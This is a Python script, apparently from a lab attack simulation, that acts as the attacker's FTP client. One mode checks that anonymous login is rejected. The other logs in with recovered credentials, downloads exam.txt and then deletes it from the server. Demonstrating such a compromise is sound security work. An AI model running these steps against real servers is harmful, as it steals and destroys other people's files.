#!/usr/bin/env python3
"""
FTP client helper for the attack simulation. Two modes:

  baseline   -- try to reach the server with no valid credentials
                (anonymous login), to show that "in theory" the exam
                file is not reachable this way.

  exploit    -- log in with a *recovered* username/password, list the
                directory, download exam.txt, then delete it from the
                server -- demonstrating full compromise once the
                credentials have been recovered.

Uses only the Python standard library's ftplib as the FTP client (this
script plays the role of the attacker's tool, not jFTP itself).
"""
import argparse
import ftplib
import os
import sys


def baseline(host, port):
    print(f"[baseline] attempting anonymous login to {host}:{port} ...")
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=5)
    try:
        ftp.login()  # anonymous
        print("[baseline] UNEXPECTED: anonymous login succeeded")
        try:
            files = ftp.nlst()
            print(f"[baseline] directory listing: {files}")
        except ftplib.all_errors as e:
            print(f"[baseline] listing failed: {e}")
        ftp.quit()
        return False  # "exam was reachable without credentials" = bad
    except ftplib.error_perm as e:
        print(f"[baseline] anonymous login rejected as expected: {e}")
        ftp.close()
        return True  # exam is NOT reachable without credentials, as intended


def exploit(host, port, user, password, remote_file, local_dir):
    print(f"[exploit] logging in to {host}:{port} as recovered user {user!r} ...")
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=5)
    ftp.login(user=user, passwd=password)
    print("[exploit] login succeeded with recovered credentials")

    files = ftp.nlst()
    print(f"[exploit] directory listing: {files}")

    local_path = os.path.join(local_dir, remote_file)
    with open(local_path, "wb") as f:
        print(f"[exploit] downloading {remote_file} -> {local_path}")
        ftp.retrbinary(f"RETR {remote_file}", f.write)

    print(f"[exploit] deleting {remote_file} from the server")
    ftp.delete(remote_file)

    files_after = ftp.nlst()
    print(f"[exploit] directory listing after delete: {files_after}")

    ftp.quit()
    return local_path


def main():
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="mode", required=True)

    p_base = sub.add_parser("baseline")
    p_base.add_argument("--host", default="127.0.0.1")
    p_base.add_argument("--port", type=int, default=2121)

    p_exp = sub.add_parser("exploit")
    p_exp.add_argument("--host", default="127.0.0.1")
    p_exp.add_argument("--port", type=int, default=2121)
    p_exp.add_argument("--user", required=True)
    p_exp.add_argument("--password", required=True)
    p_exp.add_argument("--remote-file", required=True)
    p_exp.add_argument("--local-dir", required=True)

    args = parser.parse_args()

    if args.mode == "baseline":
        ok = baseline(args.host, args.port)
        sys.exit(0 if ok else 1)
    else:
        exploit(
            args.host,
            args.port,
            args.user,
            args.password,
            args.remote_file,
            args.local_dir,
        )


if __name__ == "__main__":
    main()
